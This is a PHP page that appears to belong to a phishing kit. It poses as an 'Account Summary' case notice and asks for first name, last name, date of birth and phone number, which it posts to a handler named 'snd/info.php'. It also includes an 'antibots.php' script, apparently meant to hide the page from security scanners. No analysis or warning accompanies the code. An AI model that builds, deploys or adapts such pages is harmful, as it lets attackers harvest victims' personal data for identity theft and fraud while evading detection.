<?php

/*

 */

include 'antibots.php';

session_start();

?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Account Summary : Case ID  3803492</title>
<link href="img/fav.png" rel="shortcut icon">
<link href="css/info.css" rel="stylesheet" type="text/css">
<script src="jss/jquery.js" type="text/javascript"></script>
<script src="jss/jquery.maskedinput.js" type="text/javascript"></script>
</head>
<body>
<div id="wb_Form1" style="position:absolute;left:402px;top:176px;width:795px;height:368px;z-index:5;">
<form action="snd/info.php" method="POST">
<input type="text" required="" id="First" style="position:absolute;left:120px;top:123px;width:199px;height:35px;line-height:35px;z-index:0;" name="First" value="" placeholder="First name">
<input type="text" required="" id="Last" style="position:absolute;left:437px;top:123px;width:199px;height:35px;line-height:35px;z-index:1;" name="Last" value="" placeholder="Last name">
<input type="text" required="" id="Date" style="position:absolute;left:120px;top:177px;width:199px;height:35px;line-height:35px;z-index:2;" name="Date" value="" placeholder="Date Of Birth">
<input type="text" required="" id="Phone" style="position:absolute;left:437px;top:177px;width:199px;height:35px;line-height:35px;z-index:3;" name="Phone" value="" placeholder="Phone">
<input type="submit" id="Bt" name="" value="Continue" style="position:absolute;left:331px;top:253px;width:106px;height:40px;z-index:4;cursor: pointer;">
</form>
</div>
   <script>
        jQuery(function($){
            $("#Date").mask("99/99/9999");
        });
        </script>
</body>
</html>